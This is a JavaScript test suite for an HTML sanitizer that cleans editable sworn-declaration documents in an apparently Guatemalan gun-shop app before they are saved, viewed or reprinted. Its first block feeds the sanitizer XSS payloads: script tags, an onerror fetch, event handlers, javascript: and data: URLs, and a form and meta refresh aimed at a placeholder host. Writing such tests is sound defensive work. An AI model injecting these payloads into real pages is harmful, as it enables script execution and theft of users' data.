/* Historial de declaraciones juradas.

   Antes la app armaba la declaración, la mandaba a imprimir y no guardaba
   nada. Si el cliente volvía por una copia —o si DIGECAM o la IVE preguntaban
   qué se declaró— había que rehacer el documento, y el rehecho NO era el
   mismo: el texto se edita a mano antes de firmarlo (ingresos, actividad
   económica, municipio). Se perdía justo la versión que se firmó ante notario.

   LO QUE ESTO PRUEBA DE VERDAD es el saneador. El documento sale de un
   contenteditable y se vuelve a abrir con document.write al reimprimir: si
   alguien pega HTML dentro, al reimprimirlo se ejecuta. Es el mismo agujero
   que se cerró en la auditoría (ver test/xss-escape.js), pero por otra vía —
   ahí el dato venía de la BD sin escapar; acá el HTML es intencional y no se
   puede escapar entero, hay que limpiarlo. */
const fs = require('fs');
const path = require('path');
const vm = require('vm');

const raiz = path.join(__dirname, '..');

/* Se carga el módulo real en un contexto mínimo. Object.assign(Modulos.armeria)
   necesita que el objeto exista; nada más se toca. */
const ctx = { console, Math, Date, JSON, String, Number, Object, Array, RegExp };
ctx.window = ctx;
ctx.Modulos = { armeria: {} };
ctx.UI = { esc: v => String(v ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;') };
ctx.DB = {}; ctx.Auth = { tenant: {}, user: {} };
vm.createContext(ctx);
vm.runInContext(fs.readFileSync(path.join(raiz, 'js', 'modulos', 'especializados', 'armeria-declaraciones.js'), 'utf8'), ctx);

const A = ctx.Modulos.armeria;
const limpiar = html => A._sanearDocumento(html);

let pasadas = 0, fallidas = 0;
const ok = (n, c) => { if (c) { pasadas++; console.log('PASS — ' + n); } else { fallidas++; console.log('FAIL — ' + n); } };

/* ── El saneador quita lo que ejecuta ───────────────────────────────────── */
{
  ok('quita <script> con su contenido',
     !/script/i.test(limpiar('<p>hola</p><script>robar()</script>')));
  ok('quita <script> sin cerrar',
     !/script/i.test(limpiar('<p>hola</p><script src="//malo/x.js">')));
  ok('quita iframe', !/iframe/i.test(limpiar('<iframe src="//malo"></iframe>')));
  ok('quita object y embed',
     !/object|embed/i.test(limpiar('<object data="x"></object><embed src="y">')));
  ok('quita <form> (evita que el documento envíe datos a otro lado)',
     !/<form/i.test(limpiar('<form action="//malo"><input name="dpi"></form>')));
  ok('quita <link> y <meta> (refresh a otro sitio)',
     !/<link|<meta/i.test(limpiar('<link rel=stylesheet href="//malo"><meta http-equiv="refresh" content="0;url=//malo">')));

  ok('quita onerror con comillas dobles',
     !/onerror/i.test(limpiar('<img src=x onerror="fetch(\'//malo\')">')));
  ok('quita onclick con comillas simples',
     !/onclick/i.test(limpiar("<b onclick='robar()'>texto</b>")));
  ok('quita on* sin comillas',
     !/onload/i.test(limpiar('<body onload=robar()>')));
  ok('quita onmouseover en medio de otros atributos',
     !/onmouseover/i.test(limpiar('<span class="x" onmouseover=alert(1) id="y">t</span>')));

  ok('neutraliza href javascript:',
     !/javascript:/i.test(limpiar('<a href="javascript:robar()">clic</a>')));
  ok('neutraliza src con data: (permite incrustar HTML)',
     !/data:/i.test(limpiar('<img src="data:text/html,<script>x</script>">')));
}

/* ── ...y NO rompe el documento legal ───────────────────────────────────── */
{
  const doc = `<div class="enc"><h1>Declaración jurada de ingresos</h1>
    <div class="base">Fundamento: Artículo 59 del Decreto 15-2009</div></div>
    <p>Yo, <b>Juan Pérez</b>, de <b>34</b> años de edad, <b>casado</b>,
    me identifico con DPI número <b>1234 56789 0101</b>.</p>
    <p><b>PRIMERO:</b> Que mis ingresos mensuales ascienden a Q 8,500.00.</p>
    <table><tr><td style="border:1px solid #999;padding:4px 6px"><b>Marca</b><br>Glock</td></tr></table>
    <div class="firmas"><div class="firma"><div class="linea"></div>
    <div class="rol">Declarante</div></div></div>`;
  const salida = limpiar(doc);

  ok('conserva el texto declarado', salida.includes('ingresos mensuales ascienden a Q 8,500.00'));
  ok('conserva el nombre y el DPI',
     salida.includes('Juan Pérez') && salida.includes('1234 56789 0101'));
  ok('conserva la estructura (encabezado, tabla, firmas)',
     /<h1>/.test(salida) && /<table>/.test(salida) && /class="firmas"/.test(salida));
  ok('conserva los estilos en línea del formato legal',
     salida.includes('border:1px solid #999'));
  ok('conserva las negritas de los numerales', salida.includes('<b>PRIMERO:</b>'));
  ok('no cambia un documento que ya está limpio', limpiar(salida) === salida);

  ok('vacío o nulo no revienta', limpiar(null) === '' && limpiar(undefined) === '');
}

/* ── Se sanea en los TRES caminos, no solo al guardar ───────────────────── */
{
  /* Una fila puede entrar por otra vía (API directa, restauración de un
     respaldo) sin pasar por el guardado, así que ver y reimprimir también
     tienen que limpiar. */
  const src = fs.readFileSync(path.join(raiz, 'js', 'modulos', 'especializados', 'armeria-declaraciones.js'), 'utf8');
  const enFn = (nombre) => {
    const i = src.indexOf(`async ${nombre}(`);
    if (i < 0) return false;
    return src.slice(i, i + 2600).includes('_sanearDocumento');
  };
  ok('se sanea al GUARDAR', enFn('_guardarDeclaracion'));
  ok('se sanea al VER', enFn('verDeclaracion'));
  ok('se sanea al REIMPRIMIR', enFn('reimprimirDeclaracion'));
}

/* ── Los tres tipos siguen declarados ───────────────────────────────────── */
{
  const tipos = Object.keys(A._DECLARACIONES || {});
  ok('están los tres tipos', tipos.length === 3);
  ['ingresos', 'portacion', 'origen_fondos'].forEach(t =>
    ok(`existe el tipo ${t}`, tipos.includes(t)));
  /* Los mismos valores que el CHECK de la migración 126: si acá se agrega uno
     y allá no, el guardado falla con un error de restricción. */
  ok('el tipo de origen de fondos sigue marcado como buena práctica, no como obligación',
     /buena práctica/i.test(A._DECLARACIONES.origen_fondos.label));
  ok('la del art. 59 cita su fundamento', /59/.test(A._DECLARACIONES.ingresos.base));
  ok('la de portación cita el art. 72', /72/.test(A._DECLARACIONES.portacion.base));
}

console.log(`   ${pasadas} pasadas, ${fallidas} fallidas`);
if (fallidas) process.exitCode = 1;
